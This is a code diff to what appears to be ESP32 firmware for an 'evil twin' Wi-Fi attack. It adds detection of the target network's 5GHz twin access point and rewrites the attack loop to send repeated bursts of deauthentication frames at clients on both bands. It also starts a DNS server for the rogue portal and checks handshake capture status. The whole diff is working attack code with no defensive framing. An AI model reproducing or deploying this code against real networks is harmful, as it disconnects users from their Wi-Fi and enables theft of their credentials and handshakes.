@@ -6,13 +6,18 @@
 #include "sniffer.h"
 #include "dns.h"
 #include "wifi_attacks.h"
+#include "server_api.h"
 
 
 #define EVIL_TWIN_TASK_PRIO 5
+#define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
+#define ATTACK_WINDOW        50  // RCO duration
+#define SOFTAP_REST_TIME     150   // Home channel time
 
 /* Store target information */
 static const char *TAG = "EVIL_TWIN";
 static TaskHandle_t evil_twin_task_handle = NULL;
+static bool has_5ghz_target = false;
 
 
 static void evil_twin_task(void *pvParameters) 
@@ -21,6 +26,8 @@ static void evil_twin_task(void *pvParameters)
 
     /* Get target information */
     target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
+    target_info_t twin_on_5ghz = {0};
+
     /*Try guess by ssid */
     target->vendor = getVendor((char *)&target->ssid);
 
@@ -46,19 +53,61 @@ static void evil_twin_task(void *pvParameters)
     vTaskDelay(pdMS_TO_TICKS(2000));
     /* Start sniffer and beacon tracking */
     wifi_start_sniffing(target, SNIFF_MODE_ATTACK_EVIL_TWIN);
-    //wifi_start_beacon_tracking();
+
+    /* NOTE: wifi_sniffer_scan_fill_aps utilize a mutex initialized with wifi_start_sniffing*/
+    /* Try to find 5ghz twin AP */
+    if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
+        aps_info_t *aps = malloc(sizeof(aps_info_t));
+        if(aps) {
+            if(wifi_sniffer_get_aps(aps) == ESP_OK) {
+                /* Search in scanned aps */
+                for(uint8_t i = 0; i < aps->count; i++) {
+                    /* Found same AP on 5ghz */
+                    if( (aps->ap[i].primary > 14) && (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) ) {
+                        twin_on_5ghz.attack_scheme = target->attack_scheme;
+                        twin_on_5ghz.authmode = aps->ap[i].authmode;
+                        twin_on_5ghz.channel = aps->ap[i].primary;
+                        twin_on_5ghz.group_cipher = aps->ap[i].group_cipher;
+                        twin_on_5ghz.pairwise_cipher = aps->ap[i].pairwise_cipher;
+                        twin_on_5ghz.rssi = aps->ap[i].rssi;
+                        twin_on_5ghz.vendor = target->vendor;
+                        memcpy(twin_on_5ghz.ssid, aps->ap[i].ssid, sizeof(aps->ap[i].ssid));
+                        memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, sizeof(aps->ap[i].bssid));
+                        target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
+                        has_5ghz_target = true;
+                        ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
+                        ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
+                        break;
+                    }
+                }
+            }
+            free(aps);
+        }
+    }
+
+    /* Get hadnshake status */
+    const handshake_info_t *handshake = wifi_sniffer_get_handshake();
     
     while(true)
     {
-        /* Spam softAP beacon from STA */
-        //wifi_attack_softap_beacon_spam((target_info_t * )&target);
-        /* Send deauth to clients */
-        wifi_attack_deauth_basic(NULL, target->bssid, 7);
-        vTaskDelay(pdMS_TO_TICKS(20));
-        //wifi_attack_deauth_client_bad_msg1();
-        wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
-        //wifi_attack_association_sleep();
-        vTaskDelay(pdMS_TO_TICKS(100));
+        for(uint8_t burst = 0; burst < 8; burst++) {
+            wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
+
+        /* Deauth 5Ghz twin after handshake is captured */
+        if(has_5ghz_target == true ) { //&& (handshake->handshake_captured || handshake->pmkid_captured)) {
+            if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
+                vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
+                /* Send Burst */
+                for(uint8_t burst = 0; burst < 8; burst++) {
+                    wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
+                    vTaskDelay(pdMS_TO_TICKS(5));
+                }
+            }
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME)); 
     }
 }
 
@@ -70,6 +119,8 @@ void evil_twin_start_attack(const target_info_t *targe_info)
         ESP_LOGE(TAG, "EvilTwin task already started.");
         return;
     }
+
+    has_5ghz_target = false;
 
     /* Start DNS Server */
     dns_server_start();
@@ -89,6 +140,8 @@ void evil_twin_stop_attack(void)
         ESP_LOGE(TAG, "EvilTwin task is not running.");
         return;
     }
+
+    has_5ghz_target = false;
 
     /* Stop DNS Server */
     dns_server_stop();
